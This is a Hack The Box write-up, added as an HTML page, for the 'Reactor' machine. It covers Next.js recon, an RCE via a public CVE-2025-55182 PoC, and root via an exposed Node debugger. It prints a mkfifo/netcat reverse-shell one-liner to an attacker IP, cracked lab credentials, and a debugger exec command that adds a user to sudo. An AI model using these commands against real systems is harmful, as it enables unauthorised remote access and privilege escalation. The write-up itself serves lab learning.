@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reactor — Hack The Box</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚩</text></svg>">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="scanline" aria-hidden="true"></div>
+
+  <article class="writeup">
+    <a class="writeup-back" href="../index.html#ctf">back to writeups</a>
+
+    <h1>Reactor</h1>
+    <p class="writeup-meta">
+      Hack The Box &nbsp;·&nbsp; category: web / privesc &nbsp;·&nbsp; foothold → root
+    </p>
+
+    <h2>Recon</h2>
+    <p>I started with an Nmap service scan of the target.</p>
+    <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
+|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
+3000/tcp open  ppp?</code></pre>
+    <p>
+      The target was running SSH on port 22 and an unknown service on port 3000.
+      Digging into the scan results, the application looked like it was powered by
+      <strong>Next.js</strong> — which by default runs on port 3000, so that lined up.
+    </p>
+
+    <h2>Web enumeration</h2>
+    <p>
+      The front page appeared to be some kind of reactor monitoring service. There
+      were no visible input fields or obvious attack surfaces, so I moved on to the
+      source code and found several JavaScript paths:
+    </p>
+    <pre><code>http://10.129.3.166:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
+http://10.129.3.166:3000/_next/static/chunks/webpack-db0a529a99835594.js
+http://10.129.3.166:3000/_next/static/chunks/main-app-4fbb4b1f318e39a0.js</code></pre>
+    <p>
+      I assumed these files might contain useful functions or endpoints, but after
+      inspecting them I found nothing interesting. I then ran directory and subdomain
+      enumeration with multiple wordlists for about an hour — still nothing useful.
+    </p>
+    <p>
+      My next move was to fingerprint the exact Next.js version to look for known
+      vulnerabilities. Using <strong>Wappalyzer</strong>, I confirmed the app was
+      running <strong>Next.js 15.0.3</strong>. Searching for CVEs and proof-of-concepts
+      for that version, I found a working exploit:
+    </p>
+    <blockquote>
+      <a href="https://github.com/msanft/CVE-2025-55182">CVE-2025-55182 — PoC repository</a>
+    </blockquote>
+
+    <h2>Foothold</h2>
+    <p>
+      With a working RCE PoC in hand, I went for a reverse shell. This was the only
+      payload that worked reliably — a standard <code>bash -i</code> reverse shell failed:
+    </p>
+    <pre><code>python3 poc.py http://10.129.6.163:3000/ \
+  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.15.82 4444 &gt;/tmp/f"</code></pre>
+    <p>
+      Once I had a shell, I listed the current directory and spotted a file named
+      <code>reactor.db</code>. <code>cat</code> gave unreadable output, so I ran
+      <code>strings</code> on it, which revealed two MD5 password hashes:
+    </p>
+    <pre><code>engineer:39d97110eafe2a9a68639812cd271e8e
+admin:a203b22191d744a4e70ada5c101b17b8</code></pre>
+    <p>
+      I confirmed the hash type with <code>hashid</code> (MD5) and cracked them with
+      John the Ripper against <code>rockyou.txt</code>:
+    </p>
+    <pre><code>engineer:reactor1
+admin:(not cracked)</code></pre>
+    <p>
+      The <code>engineer</code> password cracked, which let me SSH into the box and
+      grab the user flag. The <code>admin</code> hash didn't fall to <code>rockyou.txt</code>.
+    </p>
+
+    <h2>User flag</h2>
+    <pre><code>engineer@reactor:~$ cat user.txt
+<span class="flag">&lt;user-flag-here&gt;</span></code></pre>
+
+    <h2>Privilege escalation</h2>
+    <p>First I checked for sudo rights — the user had none:</p>
+    <pre><code>engineer@reactor:~$ sudo -l
+# no sudo privileges</code></pre>
+    <p>
+      Next I uploaded and ran <strong>linpeas</strong>, which flagged an interesting
+      process:
+    </p>
+    <pre><code>root  1390  ...  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code></pre>
+    <p>
+      Node.js was running as <strong>root</strong> with the debugger enabled locally on
+      port <code>9229</code>. I connected to it:
+    </p>
+    <pre><code>engineer@reactor:~$ node inspect 127.0.0.1:9229</code></pre>
+    <p>
+      The connection worked. Using <code>help</code> inside the debugger I found the
+      <code>exec</code> functionality. Rather than spawn a shell directly, I added my
+      user to the <code>sudo</code> group as root:
+    </p>
+    <pre><code>debug&gt; exec('process.mainModule.require("child_process").execSync("usermod -aG sudo engineer")')</code></pre>
+    <p>Then I verified the group membership had changed:</p>
+    <pre><code>engineer@reactor:~$ groups
+engineer adm cdrom sudo dip plugdev lxd</code></pre>
+    <p>Finally, I switched to root and grabbed the root flag:</p>
+    <pre><code>engineer@reactor:~$ sudo su -
+root@reactor:~# cat root.txt
+<span class="flag">&lt;root-flag-here&gt;</span></code></pre>
+
+    <h2>Takeaways</h2>
+    <ul>
+      <li>An unknown service on a default framework port (3000 → Next.js) is worth fingerprinting precisely — the exact version led straight to CVE-2025-55182.</li>
+      <li>When a standard reverse shell fails, a <code>mkfifo</code>-based payload is a reliable fallback.</li>
+      <li>A local-only Node debugger (<code>--inspect</code>) running as root is a full privesc: the <code>exec</code> console runs arbitrary code with that process's privileges.</li>
+    </ul>
+  </article>
+
+  <footer class="site-footer">
+    <p><a href="../index.html">← home</a></p>
+  </footer>
+</body>
+</html>
